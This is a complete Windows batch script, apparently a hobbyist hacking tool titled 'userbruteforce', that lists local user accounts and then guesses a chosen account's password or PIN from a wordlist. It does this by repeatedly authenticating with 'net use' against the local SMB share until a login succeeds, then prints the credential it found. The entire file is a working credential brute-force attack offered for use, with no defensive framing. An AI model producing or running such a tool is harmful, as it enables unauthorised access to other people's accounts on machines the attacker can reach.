@echo off
title userbruteforce - Ebola Man
setlocal enabledelayedexpansion
chcp 65001 >nul
:start
cls
set error=-
color F
set user=""
set pinlist=""
echo.
echo      ___.                 __          _____                           
echo      \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
echo       ^| __ \_  __ \  ^|  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \ 
echo       ^| \_\ \  ^| \/  ^|  /^|  ^| \  ___/^|  ^| (  ^<_^> )  ^| \/\  \__\  ___/ 
echo       ^|___  /__^|  ^|____/ ^|__^|  \___  ^>__^|  \____/^|__^|    \___  ^>___  ^>
echo           \/                       \/                        \/    \/ 
echo.
echo    ╔════════════════════╗
echo    ║  COMMANDS:         ║
echo    ║                    ║
echo    ║  1. List Users     ║
echo    ║  2. Bruteforce     ║
echo    ║  3. Exit           ║
echo    ╚════════════════════╝

:input
set /p "=>> " <nul
choice /c 123 >nul

if /I "%errorlevel%" EQU "1" (
  echo.
  echo.
  wmic useraccount where "localaccount='true'" get name,sid,status
  goto input
)

if /I "%errorlevel%" EQU "2" (
  goto bruteforce
)

if /I "%errorlevel%" EQU "3" (
  exit
)

:bruteforce
set /a count=1
echo.
echo.
echo [TARGET USER]
set /p user=">> "
echo.
echo [PIN LIST]
set /p pinlist=">> "
if not exist "%pinlist%" (
  echo. && echo [91m[%error%][0m [97mFile not found[0m
  pause >nul
  goto start
)
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo. && echo [91m[%error%][0m [97mUser doesn't exist[0m
  pause >nul
  goto start
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.

:attempt
for /f "tokens=*" %%a in (%pinlist%) do (
  set pin=%%a
  call :varset
)

echo. && echo [91m[%error%][0m [97mPIN not found[0m
pause >nul
goto start

:success
echo.
echo [92m[+][0m [97mPIN found: %pin%[0m
net use \\127.0.0.1 /d /y >nul 2>&1
set user=
set pin=
echo.
pause >nul
goto start

:varset
net use \\127.0.0.1 /user:%user% %pin% >nul 2>&1
if /I "%errorlevel%" EQU "0" goto success
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto success
set /a count=%count%+1
goto :eof

goto attempt
